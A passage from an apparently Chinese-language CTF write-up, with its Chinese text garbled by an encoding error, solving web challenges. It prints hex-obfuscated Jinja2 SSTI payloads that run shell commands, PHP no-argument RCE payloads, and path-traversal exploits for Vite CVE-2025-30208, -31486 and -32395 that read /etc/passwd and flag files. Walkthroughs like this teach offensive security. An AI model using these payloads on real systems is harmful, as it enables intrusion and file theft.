</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">waf</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;æƒ³å¹²åäº‹äº†æ˜¯å§hackerï¼Ÿå“¼ï¼Œè¿˜å¤©å‘½äººï¼Œå¯ç¬‘ï¼Œå¯æ‚²ï¼Œå¯å¹</span>
</span></span><span class="line"><span class="cl"><span class="n">Image</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span><span class="o">=</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">is_typable</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="n">k</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">k</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">secret_key</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span> <span class="ow">in</span> <span class="n">name</span> <span class="ow">and</span> <span class="n">secret_key</span><span class="p">[</span><span class="mi">2</span><span class="p">:]):</span>
</span></span><span class="line"><span class="cl">                <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;è¿â€œå…­æ ¹â€éƒ½å‡‘ä¸é½ï¼Œè°ˆä»€ä¹ˆå¤©å‘½ä¸å¤©å‘½çš„ï¼Œè¿˜æ˜¯æˆ´ä¸Šè¿™é‡‘ç®å§</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">å†å»è¥¿è¡Œå†ç»ƒå†ç»ƒ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Image</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">template1</span> <span class="o">=</span> <span class="s2">&#34;â€œå…­æ ¹â€ä¹Ÿå‡‘é½äº†ï¼Œä½ å·²ç»å¯ä»¥ç›´é¢å¤©å‘½äº†ï¼æˆ‘å¸®ä½ æŠŠâ€œsecret_keyâ€æ›¿æ¢ä¸ºäº†â€œ{{}}â€</span>
</span></span><span class="line"><span class="cl"><span class="n">æœ€å</span><span class="err">ï¼Œ</span><span class="n">å¦‚æœä½ ç”¨äº†cat</span><span class="err">ï¼Œ</span><span class="n">å°±å¯ä»¥è§åˆ°é½å¤©å¤§åœ£äº†</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">template</span><span class="o">=</span> <span class="n">template</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;å¤©å‘½&#34;</span><span class="p">,</span><span class="s2">&#34;{{&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;éš¾è¿&#34;</span><span class="p">,</span><span class="s2">&#34;}}&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">template</span> <span class="o">=</span> <span class="n">template</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;cat&#34;</span> <span class="ow">in</span> <span class="n">template</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">template2</span> <span class="o">=</span> <span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">æˆ–è®¸ä½ è¿™åªå«å¤©å‘½äººçš„çŒ´å­</span><span class="err">ï¼Œ</span><span class="n">çœŸçš„èƒ½åšåˆ°</span><span class="err">ï¼Ÿ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Image</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">template1</span><span class="o">+</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span><span class="o">+</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">template2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">error_message</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;500æŠ¥é”™äº†ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="n">template</span><span class="p">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">error_message</span><span class="p">,</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/hint&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hinter</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">template</span><span class="o">=</span><span class="s2">&#34;hintï¼š</span>
</span></span><span class="line"><span class="cl"><span class="n">æœ‰ä¸€ä¸ªaazzè·¯ç”±</span><span class="err">ï¼Œ</span><span class="n">å»é‚£é‡Œçœ‹çœ‹å§</span><span class="err">ï¼Œ</span><span class="n">å¤©å‘½äºº</span><span class="err">!</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/aazz&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">finder</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">source_code</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="n">source_code</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;, 200, {&#39;Content-Type&#39;: &#39;text/html; charset=utf-8&#39;}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">å¤©å‘½cycler[&#34;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#34;][&#34;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#34;][&#34;\x6f\x73&#34;][&#34;\x70\x6f\x70\x65\x6e&#34;](&#39;cat /tgffff11111aaaagggggggg&#39;)[&#34;\x72\x65\x61\x64&#34;]()éš¾è¿
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸ªè°ƒå‡ºæ¥ä¸å®¹æ˜“ï¼ŒåŸå‹æ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{cycler.__init__.__globals__.os.popen(&#39;ls /&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>ç„¶å16è¿›åˆ¶ç¼–ç å³å¯ï¼Œç›¸å½“å¥½ç”¨ï¼Œå¦‚æœå°æ‹¬å·ï¼Œcycleræ²¡ç¦ç”¨åŸºæœ¬å¯ç”¨</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{cycler[&#34;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#34;][&#34;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#34;][&#34;\x6f\x73&#34;][&#34;\x70\x6f\x70\x65\x6e&#34;](&#39;ls /&#39;)[&#34;\x72\x65\x61\x64&#34;]()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>è´´ä¸€ä¸ªç±»ä¼¼payloadï¼Œè™½ç„¶è¿™é‡Œä¸èƒ½ç”¨</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{lipsum[&#34;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#34;][&#34;\x6f\x73&#34;][&#34;\x70\x6f\x70\x65\x6e&#34;](&#39;ls /&#39;)[&#34;\x72\x65\x61\x64&#34;]()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="aaaå·æ¸¡é˜´å¹³æ— å­—æ¯æ•°å­—rce"><strong>AAAå·æ¸¡é˜´å¹³</strong>ï¼ˆæ— å­—æ¯æ•°å­—rceï¼‰
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$tgctf2025</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;tgctf2025&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/0|1|[3-9]|\~|\`|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\,|\&lt;|\.|\&gt;|\/|\?|</span><span class="se">\\\\</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$tgctf2025</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//hintï¼šä½ å¯ä»¥å¯¹ç€é”®ç›˜ä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œç„¶ååœ¨æ²¡è¿‡æ»¤çš„ç¬¦å·ä¸Šç”¨è®°å·ç¬”ç”»ä¸€ä¸‹ï¼ˆbushi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">eval</span><span class="p">(</span><span class="nv">$tgctf2025</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢*ï½â—&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="è§£æ³•ä¸€get_defined_vars">è§£æ³•ä¸€ï¼šget_defined_vars()
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">tgctf2025</span><span class="o">=</span><span class="n">eval</span><span class="p">(</span><span class="n">end</span><span class="p">(</span><span class="n">current</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">())));</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;cat  /f*&#39;</span><span class="p">);</span> <span class="c1">#evalæ¢æˆassertä¹Ÿè¡Œ </span>
</span></span></code></pre></td></tr></table>
</div>
</div><img src="image-20250416222608272.png" alt="image-20250416222608272" style="zoom:50%;" />
<h4 id="è§£æ³•äºŒgetallheaders">è§£æ³•äºŒï¼šgetallheaders()
</h4><img src="image-20250416225323447.png" alt="image-20250416225323447" style="zoom:50%;" />
<p>è¿™ä¸ªæ²¡çŸ¥é“è·å–çš„è¯·æ±‚å¤´ä½ç½®ï¼Œå³çˆ†ç ´ä½ç½®ï¼Œæ‰€ä»¥è¦ä¸æ–­å‘åŒ…ï¼Œä¸‹é¢æœ‰2ç§æŒ‡å®šä½ç½®çš„æ‰“æ³•ï¼Œä½†æ˜¯æ²¡å¤ç°å‡º</p>
<p><a class="link" href="https://xz.aliyun.com/news/5922"  target="_blank" rel="noopener"
    >ByteCTFä¸€é“é¢˜çš„åˆ†æä¸å­¦ä¹ PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨-å…ˆçŸ¥ç¤¾åŒº</a></p>
<h4 id="è§£æ³•ä¸‰session_id">è§£æ³•ä¸‰ï¼šsession_id()
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">session_start();system(hex2bin(session_id()));
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PHPSESSID=636174202f666c6167         #è§£ç æ˜¯cat /flag æ³¨æ„æ•°å­—åé¢ä¸è¦æœ‰ç©ºæ ¼		
</span></span></code></pre></td></tr></table>
</div>
</div><img src="image-20250416232256965.png" alt="image-20250416232256965" style="zoom:50%;" />
<p>æœ¬æ¥è¿˜æœ‰è§£æ³•ï¼Œä½†æ˜¯æ²¡å¤ç°å‡ºæ¥ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„æ–‡ç« </p>
<p><a class="link" href="https://blog.csdn.net/2301_76690905/article/details/133808536"  target="_blank" rel="noopener"
    >æ— å‚æ•°RCEç»•è¿‡çš„è¯¦ç»†æ€»ç»“ï¼ˆå…­ç§æ–¹æ³•ï¼‰_æ— å‚æ•°çš„å–årce-CSDNåšå®¢</a></p>
<h3 id="aaaå·æ¸¡é˜´å¹³å¤ä»‡"><strong>AAAå·æ¸¡é˜´å¹³ï¼ˆå¤ä»‡ï¼‰</strong>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$tgctf2025</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;tgctf2025&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/0|1|[3-9]|\~|\`|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\,|\&lt;|\.|\&gt;|\/|\?|</span><span class="se">\\\\</span><span class="s2">|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&#34;</span><span class="p">,</span> <span class="nv">$tgctf2025</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//hintï¼šä½ å¯ä»¥å¯¹ç€é”®ç›˜ä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œç„¶ååœ¨æ²¡è¿‡æ»¤çš„ç¬¦å·ä¸Šç”¨è®°å·ç¬”ç”»ä¸€ä¸‹ï¼ˆbushi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">eval</span><span class="p">(</span><span class="nv">$tgctf2025</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢*ï½â—&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰“ä¸Šé¢æ³•3</p>
<img src="image-20250416234815836.png" alt="image-20250416234815836" style="zoom:50%;" />
<h4 id="éé¢„æœŸ">éé¢„æœŸ
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?tgctf2025=system(implode(apache_request_headers()));	#è¿™é‡Œæœ‰ç‚¹é—®é¢˜ï¼Œæ‰“ä¸äº†äº†
</span></span><span class="line"><span class="cl">?tgctf2025=system(hex2bin(key(apache_request_headers()))); #è¯·æ±‚å¤´å½“å‘½ä»¤
</span></span></code></pre></td></tr></table>
</div>
</div><img src="image-20250417000956452.png" alt="image-20250417000956452" style="zoom:50%;" />
<h3 id="å‰ç«¯game"><strong>å‰ç«¯GAME</strong>
</h3><p><code>æ‰“viteæ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2025-30208ï¼‰</code></p>
<p><a class="link" href="https://blog.csdn.net/IDHALASHAO/article/details/146611941"  target="_blank" rel="noopener"
    >ã€CVE-2025-30208ã€‘| Vite-æ¼æ´åˆ†æä¸å¤ç°-CSDNåšå®¢</a></p>
<p><a class="link" href="https://www.panziye.com/front/16376.html"  target="_blank" rel="noopener"
    >Viteå­˜åœ¨CVE-2025-30208å®‰å…¨æ¼æ´ï¼ˆé™„ä¿®å¤æ–¹æ¡ˆå’Œæ¼”ç¤ºç¤ºä¾‹ï¼‰ _ æ½˜å­å¤œä¸ªäººåšå®¢</a></p>
<p>å…ˆè¯•è¯•è¯»ç¯å¢ƒï¼š<code>http://127.0.0.1:58549/@fs/etc/passwd?import&amp;raw??</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/@fs/etc/passwd?raw3		#è¿™ä¸ªå‘½ä»¤ä¹Ÿè¡Œ
</span></span></code></pre></td></tr></table>
</div>
</div><img src="image-20250415102004045.png" alt="image-20250415102004045" style="zoom:50%;" />
<p>æ¥ä¸‹æ¥æ‰¾flagè·¯å¾„</p>
<img src="image-20250415104143382.png" alt="image-20250415104143382" style="zoom:50%;" />
<p>æ‰€ä»¥æœ€åæ‰“</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/@fs/tgflagggg?import&amp;raw3  æˆ–è€…   /@fs/tgflagggg?raw3
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="å‰ç«¯game-plus"><strong>å‰ç«¯GAME Plus</strong>
</h3><p>flagè·¯å¾„è¿˜æ˜¯åœ¨åŸåœ°æ–¹</p>
<img src="image-20250415104349196.png" alt="image-20250415104349196" style="zoom:50%;" />
<p>æ ¹æ®ä¸Šé¢çš„æ€è·¯æœç´¢viteæ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ‰¾åˆ°ä¸€ç¯‡å¥½æ–‡</p>
<p><a class="link" href="https://xz.aliyun.com/news/17655"  target="_blank" rel="noopener"
    >Viteå¼€å‘æœåŠ¡å™¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æå¤ç°ï¼ˆCVE-2025-31125ï¼‰-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p>ç»è¿‡å°è¯•ï¼Œå‘ç°æ˜¯CVE-2025-31486</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/@fs/tgflagggg?import&amp;?meteorkai.svg?.wasm?init
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/@fs/tgflagggg?meteorkai.svg?.wasm?init 
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¹Ÿå‚è€ƒæ­¤æ–‡<a class="link" href="https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&amp;mid=2247483811&amp;idx=1&amp;sn=2b4403023fd911f611bf5590ea3796d6&amp;scene=21#wechat_redirect"  target="_blank" rel="noopener"
    >å¤ç°ä¸ä¿®å¤æŒ‡å—ï¼šViteä»»æ„æ–‡ä»¶è¯»å–æ¼æ´bypassï¼ˆCVE-2025-31486ï¼‰</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tgflagggg?.svg?.wasm?init
</span></span><span class="line"><span class="cl">@fs/app/?/../../../../../tgflagggg?import&amp;?raw
</span></span></code></pre></td></tr></table>
</div>
</div><p>è§£ç å¾—flag</p>
<p><img src="/p/2025-tgctf-write.up/image-20250415110550334.png"
	width="1602"
	height="319"
	srcset="/p/2025-tgctf-write.up/image-20250415110550334_hu_6578f9233d132451.png 480w, /p/2025-tgctf-write.up/image-20250415110550334_hu_9d0587b6970c5bc.png 1024w"
	loading="lazy"
	
		alt="image-20250415110550334"
	
	
		class="gallery-image" 
		data-flex-grow="502"
		data-flex-basis="1205px"
	
></p>
<h3 id="å‰ç«¯game-ultra"><strong>å‰ç«¯GAME Ultra</strong>
</h3><p>è€ƒæœ€æ–°çš„cve</p>
<p><a class="link" href="https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA"  target="_blank" rel="noopener"
    >å¤ç°ä¸ä¿®å¤æŒ‡å—ï¼šViteå†æ¬¡bypassï¼ˆCVE-2025-32395ï¼‰</a></p>
<p>æ‰“/@fs/tmp/å¯ä»¥çœ‹åˆ°ç»å¯¹è·¯å¾„</p>
<img src="image-20250415113442328.png" alt="image-20250415113442328" style="zoom:50%;" />
<p>åŸå‹pocæ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># è¿™é‡Œçš„/x/x/x/vite-project/æ˜¯æŒ‡Viteæ‰€åœ¨çš„ç»å¯¹è·¯å¾„
</span></span><span class="line"><span class="cl">curl --request-target /@fs/x/x/x/vite-project/#/../../../../../etc/passwd http://localhost:5173/
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl  --request-target /@fs/app/#/../../../../../tgflagggg http://127.0.0.1:59349/
</span></span></code></pre></td></tr></table>
</div>
</div><img src="image-20250415113902055.png" alt="image-20250415113902055" style="zoom:50%;" />
<p>ä¹Ÿå¯ä»¥ç”¨ä»£ç å®ç°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">æ³¨æ„ä½¿ç”¨requestsæ²¡æ³•å¤ç°ã€‚å¯ä»¥ä½¿ç”¨http.clientï¼Œå®ƒæ˜¯Pythonæ ‡å‡†åº“ä¸­æä¾›çš„ä¸€ä¸ªåº•å±‚çš„HTTPå®¢æˆ·ç«¯æ¨¡å—ï¼Œç›´æ¥ä¸ç½‘ç»œå¥—æ¥å­—äº¤äº’æ¥å‘é€å’Œæ¥æ”¶HTTPè¯·æ±‚å’Œå“åº”ï¼Œèƒ½å¤Ÿå®ç°ç±»ä¼¼curl --request-targetçš„åŠŸèƒ½ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">http.client</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ›¿æ¢ä¸ºå®é™…çš„ IP åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
